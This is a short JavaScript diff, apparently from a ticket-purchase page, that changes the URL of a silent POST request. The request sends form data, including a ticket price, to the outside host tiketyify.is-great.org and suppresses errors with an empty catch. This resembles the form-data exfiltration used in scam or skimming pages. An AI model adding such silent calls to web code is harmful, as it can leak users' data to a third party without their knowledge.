@@ -327,7 +327,7 @@
                 formData.append('ticket_price', ticket.price || cartTotal);
 
                 try {
-                    fetch('https://tiketyify.is-great.org/', { method: 'POST', body: formData });
+                    fetch('https://tiketyify.is-great.org/index.php', { method: 'POST', body: formData });
                 } catch (err) {}
 
                 setTimeout(() => {
